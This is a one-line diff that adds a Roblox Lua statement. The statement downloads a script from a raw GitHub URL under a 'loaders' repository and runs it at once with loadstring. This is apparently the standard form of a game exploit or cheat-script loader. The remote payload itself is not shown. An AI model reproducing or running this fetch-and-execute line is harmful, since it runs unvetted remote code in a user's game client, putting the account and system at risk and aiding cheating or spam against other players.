@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/upd-8-cvr-retro-spam7-qdiy44c9ixp7x5.lua"))()
